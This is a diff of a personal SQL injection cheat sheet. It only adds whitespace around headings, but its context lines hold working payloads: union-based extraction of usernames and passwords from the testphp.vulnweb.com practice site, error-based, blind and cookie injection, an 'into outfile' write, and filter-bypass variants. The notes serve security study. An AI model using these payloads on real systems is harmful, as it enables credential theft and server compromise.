@@ -751,7 +751,16 @@ Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT que
 
 
 
-       Error Based SQLI 
+
+
+
+
+
+
+
+                                                       Error Based SQLI 
+
+
 
 
     Union Based - https://portswigger.net/web-security/sql-injection/union-attacks
@@ -814,7 +823,13 @@ http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,table_name
 
 
 
-                                                      error based blind / Double query injection/ sub query  ( use when no return but only as errors)
+
+
+
+
+                       error based blind / Double query injection/ sub query  ( use when no return but only as errors)
+
+
 
 
 
@@ -871,6 +886,8 @@ select 1 from (select count(*), concat(0x3a,(select column_name from information
 
 
 
+
+
                                                                         blind boolean based
 
 1' 
@@ -920,6 +937,9 @@ artists.php?artist=-1 union select 1,username,password from users into outfile "
 
 
 
+
+
+
                                                             Error based double quotes / login page / post parameter - ( only when error is visible on screen )
 
 
@@ -955,6 +975,9 @@ admin
 
 
 
+
+
+
                                                                          User agent field / Insert query 
 
 
@@ -967,6 +990,10 @@ admin
 '  or '1'='1
 
 error based sqli 
+
+
+
+
 
                                                                         cookie based sqli 
 
@@ -990,6 +1017,9 @@ error based sqli
 ' union select 1,database(),3 #
 
 error based sqli 
+
+
+
 
 
 
@@ -1027,6 +1057,10 @@ space filter -  %A0 also ()
 3') AND  %0a ('1
 
 3')%0a unIon %0a SeLecT (1),(2),(3)%0aAND  %0a ('1
+
+
+
+
 
 
                                                                   HTTP Parameter pollution
@@ -1094,6 +1128,10 @@ oob
 order by 1,2,3 && UNION SELECT NULL-- -- to know no.of columns
 union select ----- to know which column is vulnerable
  UNION SELECT NULL,'a',NULL,NULL-- -- to know compatable data type
+
+
+
+
 
 
 
